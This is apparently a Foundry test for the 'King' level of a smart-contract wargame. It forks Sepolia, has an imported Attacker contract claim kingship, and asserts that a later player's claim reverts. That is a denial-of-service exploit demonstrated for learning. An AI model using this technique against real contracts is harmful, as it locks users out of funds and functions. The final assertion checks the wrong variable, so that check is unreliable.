// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {Attacker} from "../src/09-King/Attacker.sol";

interface IKing{
    function _king() external view returns(address);
    function prize() external view returns(uint256);
}

interface IAttacker{}

contract TestKing is Test{
    address constant private TARGET_ADDRESS = 0x4Ce89DFEFAc8ABd32A7298c8f946eB9d2645FA3a;
    IKing target;
    Attacker attacker;
    address randomUser;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);
        target = IKing(TARGET_ADDRESS);
        attacker = new Attacker();
        randomUser = makeAddr("randomUser");
        deal(address(attacker), target.prize() + 1);
    }

    function testKing() public {

        attacker.attack{value: target.prize() + 1}();
        address newKing = target._king();

        assertEq(newKing, address(attacker));

        vm.startPrank(randomUser);
        deal(randomUser, target.prize() + 1);
        
        vm.expectRevert();
        address(target).call{value: address(randomUser).balance}("");
        vm.stopPrank();

        address finalKing = target._king();
        assertEq(newKing, address(attacker));
    }

}